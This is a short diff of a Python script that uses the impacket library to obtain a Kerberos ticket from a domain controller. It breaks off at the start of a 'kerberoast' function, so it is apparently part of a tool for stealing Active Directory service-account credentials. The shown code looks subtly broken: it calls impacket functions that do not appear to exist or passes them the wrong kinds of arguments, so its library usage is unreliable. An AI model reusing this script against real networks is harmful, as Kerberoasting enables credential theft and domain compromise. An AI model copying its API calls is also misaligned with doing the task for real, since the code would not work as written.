@@ -1,25 +1,30 @@
-from impacket.krb5 import constants, types
-from impacket.krb5.asn1 import AP_REQ
 from impacket.krb5.ccache import CCache
 from impacket.krb5.types import Principal
 from impacket.smbconnection import SMBConnection
-from impacket.examples import logger
-from impacket import kerberos
 
 def kerberos_auth(username, password, domain, dc_ip):
     try:
-        logger.setLevel(1)
+        # Connect to the Domain Controller via SMB
+        smb = SMBConnection(dc_ip, dc_ip)
+        smb.login(username, password, domain)
 
-        # Request a TGT directly
-        krb_cred = kerberos.KerberosCredential(username=username, password=password, domain=domain)
-        krbtgt, krbctx = krb_cred.getKerberosTGT()
+        # Initialize a CCache object
+        ccache = CCache()
 
-        return krbtgt, krbctx
+        # Create a principal for the user
+        user_principal = Principal(f"{username}@{domain}", type=Principal.NT_PRINCIPAL)
+
+        # Get a TGT for the user
+        smb.kerberosLogin(user_principal, password, domain, ccache)
+
+        # Retrieve the TGT from the CCache
+        krbtgt = ccache.getCredential(user_principal)
+
+        return krbtgt, None
 
     except Exception as e:
         print(f"Error during Kerberos authentication: {e}")
         return None, None
-
 def kerberoast(domain, username, password, dc_ip):
     try:
         print(f"Attempting to Kerberoast accounts from {dc_ip}")
